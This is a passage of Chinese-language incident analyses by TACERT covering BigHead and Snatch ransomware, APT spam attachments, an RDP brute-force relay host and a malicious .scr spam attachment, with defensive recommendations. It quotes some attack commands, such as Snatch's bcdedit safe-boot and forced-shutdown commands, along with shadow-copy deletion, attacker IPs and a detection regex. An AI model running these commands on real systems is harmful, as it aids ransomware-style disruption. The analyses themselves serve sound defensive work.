        "content": "惡意程式 Virustotal 說明 6d27c1b457.exe 42/55 木馬/Downloader/Dropper 1.exe 59/71 木馬/Dropper/Agent/解密後產出1.exe  3 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 惡意程式 Virustotal 說明 archive.exe 54/71 木馬/Agent/Dropper/解密後產出 teleratserver.exe Teleratserver.exe 43/70 木馬/Telerat/telebot/ Xarch.exe 56/71 木馬/Dropper/Agent/解密後產出 BXIuSsB.exe BXIuSsB.exe 62/71 Ransom.BigHead.D/執行時會出現Windows update 畫面 5. 6d27c1b457.exe 執行後被加密的檔案之檔名呈現亂碼。經檢測發現是將原來 的檔案名稱使用Base 64 加密後產生亂碼的檔名。此方法與以往勒索病毒將 副檔名延伸之命名方式不同。 6. 6d27c1b457.exe 執行後,會在 C:\\Users\\TEST1\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup 資料夾內存放五個隱藏的惡意程式,並且修改登錄 檔,讓這些程式在每次開機後執行。  4 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 7. 6d27c1b457.exe 執行後,會在每個訪問過的資料夾與桌面放入勒索通知信 README_3933491.txt。該txt 檔說明所有檔案已被BIG HEAD 勒索病毒加 密,告知受害者Personal ID 資訊,並且提供一個E-mail 信箱給受害者聯絡駭 客使用。 8. 它會使用C:\\使用者\\TEST1\\AppData\\Roaming\\delback.bat 下命令,並繼續刪除 可用的影子副本。 9. 該勒索軟體會避開包含以下子字串的目錄,不加密檔案。 (1) Windows。 (2) RECYCLER、Recycler、Recycle.",
        "Page_Num": "3,4,5"
    },
    "377": {
        "File_Name": "個案分析-勒索軟體BigHead分析報告.pdf",
        "content": "Bin、RECYCLE.BIN。 (3) Program Files、Program Files (X86)。  5 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team (4) ProgramData。 (5) TEMP、Temp。 (6) AppData。 10. 從側錄封包發現主機會對外連線下表IP,其中有3 個惡意IP,而且這些IP 有下載資料之行為。 目的IP Location Host Virustotal 152.195.38.76 US ocsp.digicert.com Csc3-2010-crl.verisign.com 1/88 152.199.38.90 US ocsp.verisign.com s2.symcb.com _ 172.217.163.35 US ocsp.pki.goog Crl.pki.goog _ 34.104.35.123 US Edgedl.me.gvtl.com ( download-server) 2/88 209.197.3.8 US www.download.windowsupdate.com (下載) 9/88 三、 攻擊行為 經由樣本檢測,可推測出駭客攻擊手法。首先Big Head 透過惡意廣告散布, 當受害主機執行Big Head 後,會產生一些隱藏的惡意程式於受害主機內執行。 它除了加密檔案外,會出現Windows updates 畫面欺騙受害者、刪除影子副本, 將被加密檔案之檔名以Base64 加密產生之亂碼命名。它也會連線美國IP 下載資 料。從其攻擊手法可看出它與傳統的勒索軟體單純地將檔案加密不同,它演變成 除了勒索功能外,還搭配多種的惡意程式來進行多樣化的攻擊行為。  6 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 四、 總結與建議 1. 經由檢測BigHead 變種樣本,發現勒索軟體Big Head 試圖結合不同的惡意程 式來增加攻擊威力。 2. 被它加密過的檔案會經由base64 編碼產生新檔名,此點與以往之勒索軟體特 徵不同。 3. Big Head 利用提供Windows 更新程式來欺騙使用者,一旦使用者不慎依照駭 客的指示執行前述的「安裝程式」,螢幕會顯示正在更新的畫面,但",
        "Page_Num": "5,6,7"
    },
    "378": {
        "File_Name": "個案分析-勒索軟體BigHead分析報告.pdf",
        "content": "在此同時, 勒索軟體也在背景執行檔案加密。 4. 駭客所使用的攻擊手法不複雜,也不難讓防毒軟體察覺,但對於使用者還是 有很高風險,因為使用者很有可能因為是Windows 更新或是應用程式安裝畫 面,而忽略其危險性。 5. 為了預防它,建議使用者不開啟或執行不明來源的網頁或檔案。 ",
        "Page_Num": "7"
    },
    "379": {
        "File_Name": "個案分析-啟動安全模式的勒索病毒Snatch攻擊事件分析報告_10901.pdf",
        "content": "啟動安全模式的勒索病毒 Snatch 分析報告 臺灣學術網路危機處理中心團隊(TACERT)製 2020 年01 月  1 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 一、 事件簡介 1. 勒索病毒Snatch 最早於2018 年底被發現,但於2019 年4 月開始活躍,它攻 擊了美國、加拿大和幾個歐洲國家。由2019 年提交到Michael Gillespie 的ID Ransomware 平台的勒索通知信和加密文件樣本的激增情形,可以得知此病毒 的擴散速度如下圖所示,在2019 年4 月活躍後,在2019 年9~12 月期間該病 毒有明顯地擴大攻擊的情形。 (資料來源:BLEEPINGCOMPUTER) 2. 它不以一般使用者為目標,也沒有利用垃圾郵件或瀏覽器漏洞大規模散播自 己。該病毒鎖定特定目標進行攻擊,如攻擊公司或政府組織。 3. 它會利用微軟遠端桌面連線功能(RDP)、VNC 遠端連線軟體、Teamviewer、 Webshell 和SQL Injection 等工具的漏洞或公開的服務入侵到企業內部網路。 之後會收集該企業的相關資訊和敏感資料,監視一段時間後才發動攻擊。 4. 該病毒在2019 年12 月初出現其變種,而安全模式的設計即是該變種的新功 能。 5. 為了瞭解勒索病毒Snatch 的攻擊行為與對受害者的危害程度,本中心對病毒 樣本KB4463527.exe 進行檢測。 二、事件檢測  2 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 1. 首先,使用一台具有網路磁碟機與32 位元Windows 7 作業系統的虛擬主機, 在提升權限模式下將惡意程式KB4463527.exe (MD5:9E76E62FFF6C6C2D2DF58E4891AB6521)於該主機上執行,執行後主 機會重新開機,並且看到正在載入Windows 檔案的畫面與啟動安全模式的訊 息。 2. 在主機重新開機並進入安全模式後,發現惡意程式KB44635",
        "Page_Num": "1,2,3"
    },
    "380": {
        "File_Name": "個案分析-啟動安全模式的勒索病毒Snatch攻擊事件分析報告_10901.pdf",
        "content": "27.exe 將主機對 外的網路切斷,網路卡無法運作,並且桌面會出現 RESTORE_DGLNL_FILES.txt 的文字檔,可見在主機重開機、進入安全模式 的過程中,主機內的檔案已被陸續加密,而且在安全模式下防毒軟體未啟動, 無法攔阻此惡意程式的執行。當KB4463527.exe 執行完加密作業後,會在原 所在資料夾中消失。  3 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 3. 查看RESTORE_DGLNL_FILES.txt 的內容,發現為一封勒索通知信。駭客告 訴受害者所有檔案已被加密,只有他可以解密,並且告訴受害者可寫信到 doctor666@mail.fr 或doctor666@cock.li 這兩個信箱與他聯絡。聯絡信件的主 旨需含有主機被加密後延伸出的副檔名在內,也告訴受害者他可以免費對三 個小於1MB 的檔案解密,最後告訴受害者如果在48 小時之內沒有寫信給他 的話,被加密的資料將會永久遺失。  4 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 4. 檢視主機背景程式執行情形,發現KB4463527.exe 執行後,會呼叫bcdedit.exe 與shutdown.exe 兩個程式。bcdedit.exe 會設定重開機後進入安全模式,而 shutdown.exe 則讓主機關機。 (1) bcdedit.exe /set{current}safeboot minimal是指使用Windows上的BCDEDIT 工具,它會發出將Windows 操作系統設置為以安全模式啟動的命令,然 後立即在受感染的主機上強制地重新啟動。 (2) shutdown /r /f /t 00 是將主機關機的命令。 5. 查看主機內各檔案的狀況,發現除了C:\\Windows 與C:\\Program Files 內的檔 案外,所有檔案都被加密,並且在檔名後延伸出副檔名dglnl,可見勒索病毒 Snatch 為了維護系統穩定性,才未對C:\\Windows 與C:\\Program Files 兩資料",
        "Page_Num": "3,4,5"
    },
    "381": {
        "File_Name": "個案分析-啟動安全模式的勒索病毒Snatch攻擊事件分析報告_10901.pdf",
        "content": "夾的檔案加密。此外,因主機重開機後對外網路不通的關係,使原先連線主 機的網路磁碟機內的檔案未被加密。 6. 檢視主機之登錄檔內容,發現在「電腦 \\HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services\\SuperBackup Man」內將KB4463527.exe 設定為自動執行,而且定義SuperBackupMan 服務 為每天執行系統備份,有效地偽裝成一個合法的Windows 系統服務。  5 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 7. 在登錄檔「電腦 \\HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Mi nimal\\SuperBackupMan」內,發現勒索軟體Snatch 將SuperBackupMan 服務 註冊在Windows 登錄檔中,以便在安全模式啟動期間啟動它。 8. 使用AutoRun 工具檢視,發現RESTORE_DGLNL_FILES.txt 被設定在重開機 後開啟,而KB4463527.exe 被設定為一個名叫SuperBackupMan 的Windows 服務。 9. 檢視SuperBackupMan 服務的屬性,得知它具有防止其在執行時被使用者卸 載、暫停或停止的屬性,而SuperBackupMan 的名稱通常會被使用者認為該  6 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 服務是系統備份工具的服務,將放鬆使用者的警惕心。 10. 檢視KB4463527.exe 的程式碼,發現該程式內含有PGP 公鑰區塊,可見該勒 索軟體的編碼者將PGP 公鑰硬編碼到該檔案中。 11. 程式KB4463527.exe 經Virustotal 檢測,其惡意比例為49/70,仍有多家防毒 軟體公司無法識別它,而且有多家防毒軟體公司以Snatch 命名它。  7 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team  8 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 三、事件攻擊行為",
        "Page_Num": "5,6,7,8,9"
    },
    "382": {
        "File_Name": "個案分析-啟動安全模式的勒索病毒Snatch攻擊事件分析報告_10901.pdf",
        "content": "示意圖 1. 駭客透過暴力攻擊破解管理者帳戶的密碼後,侵入企業內部網路,並且 使用遠端桌面連線登入伺服器。 2. 利用管理者帳戶登入同一網路上的網域控制伺服器,並且監控整個網域 內的主機。 3. 受害主機下載勒索軟體Snatch 的檔案到硬碟中,並且執行它。 4. 勒索軟體Snatch 設置自己為一個名為SuperBackupMan 的Windows 服務。 5. 勒索軟體Snatch 呼叫bcdedit.exe 設定重開機後進入安全模式。 6. 勒索軟體Snatch 呼叫shutdown.exe 讓主機關機。 7. 受害主機重新開機後進入安全模式。 8. 勒索軟體加密受害主機內的檔案。 四、總結與建議 1. 勒索軟體Snatch 會將自身設置為在安全模式啟動期間運行的服務。它可  9 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 以快速將主機重新啟動到安全模式,並且在大多數軟體無法執行的安全模 式環境中,Snatch 會對受害者的硬碟資料進行加密。 2. 勒索軟體Snatch 將主機重開機進入安全模式後,主機對外的網路呈現斷 網狀態,故惡意程式Snatch 的加密檔案範圍僅限受害主機。 3. 勒索軟體Snatch 透過啟動安全模式的方式繞過防毒軟體的阻攔,增加攻 擊成功的機會,非一般典型的勒索軟體。 4. 勒索軟體Snatch 建立降低使用者防備心的Windows 服務 SuperBackupMan,讓自己在主機重新開機後在安全模式下持續進行著。 5. 關於Snatch 攻擊事件的預防措施,有下列幾點建議。 (1) 不將遠端桌面連線(RDP)的平台暴露在未受保護的網路上,當有連線 需求時,可透過VPN 的方式進行企業內部網路的RDP 連線。 (2) 對提供遠端連線服務的軟體與可能造成Webshell 和SQL Injection 攻擊 的漏洞進行控管與偵測。 (3) 當系統管理者帳戶登入主機時,應實施多因素身分驗證的方式來進行 伺服器的登入,降低暴力攻擊",
        "Page_Num": "9,10"
    },
    "383": {
        "File_Name": "個案分析-啟動安全模式的勒索病毒Snatch攻擊事件分析報告_10901.pdf",
        "content": "成功的機率。 (4) 多台伺服器的管理者帳戶不可使用相同一組帳戶名稱與密碼。 (5) 加強管理者帳戶的密碼設定之複雜度,並且定期更換密碼。 (6) 企業內部網路內所分享的重要文件資料夾,應設置存取權限的管控機 制。 (7) 定期檢測各伺服器內系統與軟體之漏洞,並進行修補。 (8) 定期檢查各伺服器是否存在異常事件行為。如是否有新增帳戶、Guest 帳戶是否被啟用、Windows 系統日誌是否有異常、防毒軟體是否有執 行錯誤或異常中止之現象等。 (9) 定期備份各伺服器的資料與定期更新防毒軟體病毒碼。  10 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 五、相關報導 1. Snatch Ransomware Reboots to Windows Safe Mode to Bypass AV Tools https://www.bleepingcomputer.com/news/security/snatch-ransomware-reboots-to- windows-safe-mode-to-bypass-av-tools/ 2.勒索軟體將電腦以安全模式重開機以躲過防毒偵測 https://www.ithome.com.tw/news/134771 3. Snatch ransomware reboots PCs into Safe Mode to bypass protection https://news.sophos.com/en-us/2019/12/09/snatch-ransomware-reboots-pcs-into-saf e-mode-to-bypass-protection/ ",
        "Page_Num": "10,11"
    },
    "384": {
        "File_Name": "個案分析-垃圾郵件APT攻擊分析報告.pdf",
        "content": "個案分析- 垃圾郵件APT 攻擊分析報告 TACERT 臺灣學術網路危機處理中心團隊製 2012/12  2 Taiwan Academic Network Computer emergency Response Team(TACERT) 前言 APT 為進階持續性滲透攻擊(Advanced Persistent Threat 的縮寫),APT 攻擊會根據攻擊目 標的喜好和生活型態,客製惡意網頁、文件、垃圾郵件等,持續不斷地發送,引誘攻擊 目標點擊或打開,就像釣客為了釣到特定的魚,而去研究魚的習性喜好,製作出魚喜歡 的餌,並且在特定地點和時間使用這個餌,引誘目標上勾。 APT 攻擊又以垃圾郵件最常見,一封精密巧妙的郵件,如果收件者是工作的同事,附檔 又是跟工作相關的文件,基於工作上的需要,要人不打開都難,這也是APT 攻擊最難 防範的地方。 事件說明 本次的案例分析起因來自於一封附檔名為「102 年政府行政機關辦公日曆表.xls」的郵件, 該郵件的附檔並不是子虛烏有,而是政府機關每年度的行事曆,這個惡意的郵件附檔利 用社交工程,發送給相關的政府人員,引誘他們打開。附檔打開後,會在背景下載惡意 程式,連線到其他主機的443 port,而這些被連線的主機,其中有兩個位於TANet (140.xxx.21.21 與163.xxx.24.5)。示意圖如圖一。 圖一 網路連線示意圖  163.xxx.24.5 主機資訊 – 圖書館系統 – Windows 2003 – 防火牆狀態關閉 – 遠端桌面開啟  3 Taiwan Academic Network Computer emergency Response Team(TACERT) – IIS、MSSQL 服務開啟 由圖一可以看到,163.xxx.24.5 上的443 port 提供給開啟垃圾郵件附檔的受害主機連線, 另外一個9988 port,則是由駭客使用,由PID 相同得知這兩個埠號由相同的程式使用。 圖二 由PID 相同可以得知port 443 和port 9988 由同一個程式使用 PID1548 的執行程式為svchost.exe",
        "Page_Num": "1,2,3"
    },
    "385": {
        "File_Name": "個案分析-垃圾郵件APT攻擊分析報告.pdf",
        "content": ",放置在E:\\WINDOWS\\system32\\com\\下,合法的 svchost.exe 路徑應該是E:\\WINDOWS\\system32\\,由放置路徑可以知道此svchost.exe 不 是合法的程式。 圖三秀出這個假的svchost.exe 所使用的參數: – E:\\WINDOWS\\system32\\com\\svchost.exe -s 443 -e 9988 -n WinIns  4 Taiwan Academic Network Computer emergency Response Team(TACERT) 可以看到參數剛好有443 與9988 兩個數字,符合圖二的埠號資訊。 Program IP:Port E:\\WINDOWS\\system32\\com\\svchost.exe 163.xxx.24.5:443 For Victim E:\\WINDOWS\\system32\\com\\svchost.exe 163.xxx.24.5:9988 For Master 表一 惡意程式放置路徑以及其所使用的埠號 圖三 PID1548 程式的放置路徑以及使用參數 圖四E:\\WINDOWS\\system32\\com\\svchost.exe 在登錄檔中的註冊資訊 在163.xxx.24.5 主機上側錄流量(時間約一天),發現約有102 個不同的IP 自動與 163.xxx.24.5:443 有連線的動作,往來的封包表頭有相似之處,如圖四。  5 Taiwan Academic Network Computer emergency Response Team(TACERT) 圖五 與163.xxx.24.5 連線的IP 狀況 建議措施 電子郵件附檔  在開啟前先進行掃描,線上資源如VirusTotal  將附檔上傳到Google Doc 開啟 主機或個人電腦  使用防火牆  備份網路開啟的埠號,定時比對是否有異常埠號打開  對系統檔案進行Hash,定時比對 由於目前的惡意活動,都會牽涉到網路活動,對著重於提供服務的伺服器而言,GET /[a-z0-9]{8}/thread_[0-9]{*}.html  6 Taiwan Academic Network Computer emergency Response Team(TACERT) 只要定期檢視有沒有異常的服務在網路狀態上,很輕易就可以發現異常。",
        "Page_Num": "3,4,5,6"
    },
    "386": {
        "File_Name": "個案分析-垃圾郵件APT攻擊分析報告.pdf",
        "content": "相對而言, 個人主機上的惡意活動就比較難發現,只能依賴使用者對主機的狀況判斷。其中, 對系統檔案Hash,定期比對是一個比較麻煩但也相當準確的方法,麻煩的是每次 有更動系統檔就要重新Hash(更新、安裝新軟體等都會更動到)。這邊提供的建議 雖然無法百分之百防範,但至少能對主機的資訊安全起一層的保護。 ",
        "Page_Num": "6"
    },
    "387": {
        "File_Name": "個案分析-垃圾郵件的APT攻擊事件分析報告.pdf",
        "content": "個案分析- 垃圾郵件的APT 攻擊事件分析報告 TACERT 臺灣學術網路危機處理中心團隊製 2012/7  1 Taiwan Academic Network Computer emergency Response Team(TACERT) 目錄 一、 事件說明 ............................... 2 二、 事件分析 ............................... 3 三、 建議措施 ............................... 4 四、 參考資料 ............................... 6  2 Taiwan Academic Network Computer emergency Response Team(TACERT) 一、 事件說明 垃圾郵件一直是駭客喜歡使用的社交工程手法,而最近熱門的APT (Advanced Persistent Threat)更是以垃圾郵件為攻擊手法之一,攻擊者不斷 地使用引誘人打開的關鍵字發送垃圾郵件。 四月開始,某些組織成員陸續收到夾帶有惡意文件檔的垃圾郵件。這些惡意 文件檔打開之後會利用主機的漏洞入侵主機,使夾帶在惡意文件檔裡面的惡 意程式順利在主機上面執行,進行惡意活動。  CVE 2012-0158 這些惡意文件使用CVE20120158[1]漏洞入侵電腦,CVE20120158 漏洞在四 月中由微軟發布的MS12-027 更新進行修補[2],其影響的OFFICE 版本幾乎 涵蓋所有市面上的版本,由時間上來看,微軟發布更新修補漏洞之前,該漏 洞就已經大量被使用在垃圾郵件的夾帶檔。 Microsoft Office 2003 Service Pack 3 Microsoft Office 2003 Web Components Service Pack 3 Microsoft Office 2007 Service Pack 2 Microsoft Office 2007 Service Pack 3 Microsoft Office 2010 (32-bit editions) Microsoft Office 2010 Service Pack 1 (32-bit editions) 惡意的DOC 檔偽裝成正常的文件,利用社交工程引誘收件者打開。這些惡 意DOC 檔只是個載體,當使用者點擊DOC 之後,與DOC 綁在一起的惡意 執行檔會釋出並自動執行。四、五月份已知的夾帶檔名如下所列: 英文.doc kong.doc 薄熙來唱紅打黑,為什麼會身敗名裂?.doc 南海爭端不斷,中共領導人態度如何?.doc Thupten.doc Mission Command Outline.doc 子女教育補助費101 新版.doc a.doc oracle read",
        "Page_Num": "1,2,3"
    },
    "388": {
        "File_Name": "個案分析-垃圾郵件的APT攻擊事件分析報告.pdf",
        "content": "me.doc 民進黨二零一二年整體規劃.doc 1010415 違規停車單.doc  3 Taiwan Academic Network Computer emergency Response Team(TACERT) 立法院101 年4 月國防部備詢(有關後備司-紅字)及詳細條文.doc 二、 事件分析  1010415 違規停車單.doc 其中這一份惡意檔打開後的網路行為如下: Connect to 163.xxx.255.88:443 Connect to www.twnic.ddns.us:443 163.xxx.255.88 主機資訊:  位於台南市的M 中學  Windows 2008  Web Server  提供VOD 隨選線上影片教學系統  163. xxx.255.88 主機的異常活動 我們已知異常連線到163. xxx.255.88 主機的443port,443port 由udpxxxx.exe 這個程式擁有。細查了每個網路連線之後,發現2046port 的網路活動也屬 於異常活動。以下為說明圖表: 163.xxx.255.88 上的惡意程式 port 說明 C:\\windows\\syswow64\\udpxxxx.exe 443 與victim 聯繫 C:\\windows\\syswow64\\udpxxxx.exe 1020 駭客傳輸資料 C:\\windows\\syswow64\\svchost.exe –k netsvcs (C:\\windows\\syswow64\\ntxxxx.dll) 2064 Command Control  4 Taiwan Academic Network Computer emergency Response Team(TACERT) 當有使用者被攻擊成功,就會連到163. xxx.255.88:443 進行報到的動作,而 駭客則利用port2064 進行command control,port1020 則是提供駭客傳輸資 料。 三、 建議措施 如今許多提供電子郵件的公司,都有幫使用者進行郵件過濾的動作(如 Gmail),唯一般私人架設的Mail Server 在抵擋惡意郵件的能力上可能有所 疏漏,尤以學校政府單位自行架設的Mail Server 為最,建議使用電子郵件 軟體收信的使用者(如Outlook 等): – 以純文字開啟郵件 – 取消郵件預覽功能 – 對於主旨與工作無關的郵件連開啟",
        "Page_Num": "3,4,5"
    },
    "389": {
        "File_Name": "個案分析-垃圾郵件的APT攻擊事件分析報告.pdf",
        "content": "都不要馬上刪除 – 附加檔案不應該直接打開,應該另存新檔,以安全的方式打開 – 利用郵件簽章確保寄件者不被偽造 在附加檔案方面,若不能夠確定是否為惡意郵件,或基於公務上的需要必須 打開,建議可以利用線上的文件軟體,如果檔案有惡意程式夾帶,利用線上 文件軟體打開便不會傷害到本機;若文件並非惡意檔案,利用線上文件軟體 打開,仍可以呈現檔案內容,並進行編輯。以下示範Google 提供的線上文 件[3]:  步驟一、您必須有帳號能登入Google  步驟二、登入之後進入文件,將想打開的DOC 檔案上傳  5 Taiwan Academic Network Computer emergency Response Team(TACERT)  步驟三、將文件轉成Google 的格式  步驟四、上傳完成之後打開可以在列表找到,打開後發現和原本的文件 內容相同  6 Taiwan Academic Network Computer emergency Response Team(TACERT) 在主機管理者端,建議: • 伺服器前端應設置防火牆 • 防火牆僅開啟必須的埠號,其他關閉 • 備份主機初始設定值 – 埠號、行程、dll 檔的md5 等 – 一段時間比對一次,看是否有不明埠號或行程活動 四、 參考資料 [1] http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2012-0158 [2] http://technet.microsoft.com/en-us/security/bulletin/ms12-027 [3] https://docs.google.com/ ",
        "Page_Num": "5,6,7"
    },
    "390": {
        "File_Name": "個案分析-對外進行RDP攻擊的主機事件分析報告_10512.pdf",
        "content": "個案分析- 對外進行RDP 攻擊的主機 事件分析報告 臺灣學術網路危機處理中心團隊(TACERT)製 2016/12  1 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team I. 事件簡介 1. 近期接獲其他單位情資顯示,該校主機疑似有中繼站或C&C 的連線特徵。 2. 與該主機管理者聯繫後,同意讓本單位前往進行數位鑑識及惡意流向側 錄。 3. 該主機為某系所的伺服器,並且使用系統Windows Server 2003,為Web Server。 4. 伺服器有啟用遠端桌面連線服務,讓管理者進行遠端管理,但並未限制連 線來源端網段。 II. 事件檢測 1. 首先使用TCPView 查看主機的網路通訊狀態,得知目前有哪些服務是正 在啟用為Listening 或Established,明顯看出主要為Web 和RDP service 正 在啟用中,分別為TCP port 80 和 3389。 2. 檢查主機內帳號狀態除了 administrator 外,也有其他使用者帳號,其中帳 號“web”顯示的活動紀錄最為明顯,且隸屬管理者群組帳號。  2 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 3. 檢查帳號 web 的家目錄中發現到許多的駭客遺留的工具檔案,包含許多 文件檔和批次檔及執行檔,詳細檢查駭客的工具檔案發現,主要分為IP、 Port 掃描工具以及RDP 帳號管理工具及檔案傳輸工具。 4. 以hfs.exe 為例,該程式執行能夠快速創立HTTP server,不用安裝直接執 行,讓外部能夠透過HTTP browser 存取伺服器內的資料,方便性上優於 FTP 傳輸。  3 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 5. 其次xRdp.v2.1.exe 為用來建立主機帳號工具,能夠讓駭客快速建立管理 者幽靈帳號及密碼,並且也能夠快速將帳號移除之。 6. 在資料夾“s”或“複製 -s”中,含有許多IP 列表的文件檔,以及 s.exe 執行 檔和批次檔。其中批次",
        "Page_Num": "1,2,3,4"
    },
    "391": {
        "File_Name": "個案分析-對外進行RDP攻擊的主機事件分析報告_10512.pdf",
        "content": "檔內容中可看到駭客所執行的script 指令,能夠對 特定port 和ip 進行掃描並將結果存入文件中。  4 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 7. 調查ip.txt內容為欲掃描的IP列表,而s為掃描程式s.exe,result.txt和ips.txt 為掃描有開啟port 的結果。然而在掃瞄IP 列表中TANET 的IP 網段是被 排除的,推測可能規避偵測設備。 8. 檢查後發現到有一文件檔 tw3-9.txt 中,包含所有台灣網段以及TANET 網段掃描結果,應該是駭客另外針對台灣進行掃描歸檔。 9. 除了台灣網段之外,駭客還掃描了其他國家分類存檔,包含加拿大、美國、  5 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 新加坡、泰國、日本、韓國。 10. 除了 s.exe 之外,駭客還使用RDP Solid Scanner 的工具進行RDP 服務的 掃瞄,值得注意的是該工具的設定中 pause.conf 可以看到有明確指定 TANET 網段範圍,並且將疑似成功破解連入的IP 寫入檔案 connected.txt 中,其中有一筆140.11X.X.X 為TANET IP。 11. 在使用RDPSS 掃埠工具之前,駭客會先移除KB2592687 的RDP 漏洞修  6 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 補,以確保RDP scan 能夠順利進行。 12. 檢查記憶體中紀錄的連線狀態,確實剛好有port 3389 的連線被建立,表 示有人正在嘗試遠端桌面連線登入主機。此連線IP 為 41.224.242.182, 為位於北非的突尼西亞國家。 13. 檢視側錄封包的RDP 連線資訊,IP 41.224.242.182 持續密集對主機發送 RDP 的連線封包,封包大小都只有20 多KB,推測正在進行RDP 的暴力 破解攻擊。 14. 檢視其中一筆封包內容,可以看到有人正在嘗試用帳號 manager 登入失  7 臺灣學術網路",
        "Page_Num": "4,5,6,7,8"
    },
    "392": {
        "File_Name": "個案分析-對外進行RDP攻擊的主機事件分析報告_10512.pdf",
        "content": "危機處理中心(TACERT) TANet Computer Emergency Response Team 敗,並且會持續使用不同帳號進行暴力破解登入。 15. 檢查封包紀錄發現疑似中繼站的連線行為,雖然此主機目前沒有明確的中 繼站連線,但是有許多外部IP 會透過網域名稱嘗試存取port 80,而這些 網域名稱有成人網站或大陸網站的位址。 16. 此連線紀錄IP 23.247.88.82 嘗試透過網址 www.520hu.com 連線,而該網 址當時剛好解析出來的IP 之一為該主機,此網址會轉跳至成人網站入口 網頁 www.bu577.com 。  8 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 17. 此連線紀錄IP 23.247.27.58 嘗試透過網址 www.220tu.com 連線,而該網 址當時剛好解析出來的IP 之一為該主機,此網址也會轉跳至成人網站入 口網頁 www.bu660.com。  9 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 18. 由於該主機在鑑識之前有重新開機過,因此擷取的記憶體中並無重開機之 前的程式連線紀錄。駭客似乎也察覺到行蹤被發現,故封包側錄過程中並 無再次登入的跡象。 III. 網路架構圖 中繼主機 140.X.X.13:3389 駭客 被掃描主機群 Port 3389 STEP 2 大量掃描RDP服務 STEP 3 Port 3389 持續嘗試RDP登入 STEP 1 Port 3389 RDP 植入駭客工具 外部主機群 1. 駭客透過遠端桌面服務成功登入web 帳號,並植入駭客工具。 2. 駭客利用中繼主機對外大量掃描port 3389 或可能的RDP 服務。 3. 同時外部大量主機也會不斷地嘗試入侵遠端桌面服務RDP。 4. 駭客除了利用主機做RDP 掃描,也可能會用來發動DDoS 攻擊或中繼資料。 IV. 建議與總結 1. 該主機為系所的網站伺服器,並且有開啟遠端桌面RDP 服務讓管理者登 入。 2. 當初伺服器架設時候有創立一個Web ",
        "Page_Num": "8,9,10"
    },
    "393": {
        "File_Name": "個案分析-對外進行RDP攻擊的主機事件分析報告_10512.pdf",
        "content": "帳號,管理者並不清楚該帳號使用 狀態。 3. 該主機並無設定防火牆規則限制RDP 連入網段,導致web 帳號被暴力破  10 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 解入侵。 4. 由於Web 帳號屬於administrator 群組,因此在權限上可以安裝執行任何 程式,而該主機的師生資料也可能早已外洩。 5. 建議管理者定期清查主機所有帳號使用狀態,並設定群組權限。 6. 建議將RDP 遠端桌面服務增設ACL 規則,避免外部不明人士暴力破解登 入。 7. 建議定期檢查網路連線狀態及背景是否有可疑連線程式,並安裝防毒軟體 防護。 ",
        "Page_Num": "10,11"
    },
    "394": {
        "File_Name": "個案分析-帶有惡意程式的垃圾郵件SPAM攻擊事件分析報告_10605.pdf",
        "content": "個案分析- 帶有惡意程式的垃圾郵件 SPAM 攻擊事件分析報告 臺灣學術網路危機處理中心團隊(TACERT)製 106 年5 月  1 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team I. 事件簡介 1. 近期發現有針對本單位進行垃圾郵件SPAM 攻擊,其郵件以“fq”作為主 旨,且內容為述說我們大量發送SPAM 郵件,並要求依照信件內容開啟附 加檔案進行修補感染,實質上為惡意程式的壓縮檔案 “transcript.zip”。 2. 這次事件收件者位址為單位的公開服務地址,故有心人士會容易取得並且 嘗試進行滲透。從郵件Header 檢查發信者的IP,為來自越南的 113.161.8.117,而非位於寄件者的網域(.ma)國家摩洛哥,表示寄件者名 稱是偽造的。 3. 郵件附加檔案解壓縮後,為一支偽裝成文件檔TXT 的SCR 執行檔 “transcript.txt....scr”,透過在檔案名稱尾端插入大量空白字元來遮 蔽其附檔名SCR,誘使使用者不注意執行。  2 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team II. 事件檢測 1. 在測試惡意程式時候,預先使用Win7(x86)來開啟執行該惡意程式 “transcript.txt.scr”,因為預設檔名插入大量空白過於冗長,導致 32 位元系統無法正常辨識執行。因此該惡意程式只對於64 位元系統有 效。 2. 實際執行惡意程式scr 檔案後,在視窗上並無出現任何訊息,但透過 procexp 檢視背景程式狀態,可以看到scr 惡意程式產生出新的子程式 services.exe。 3. 該services.exe 是由transcript.txt.scr 所產生,並且位於暫存資料夾  3 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 內,檢查services.exe 的連線狀態能看出有開啟Port Listening,表示 能夠讓駭客或C&",
        "Page_Num": "1,2,3,4"
    },
    "395": {
        "File_Name": "個案分析-帶有惡意程式的垃圾郵件SPAM攻擊事件分析報告_10605.pdf",
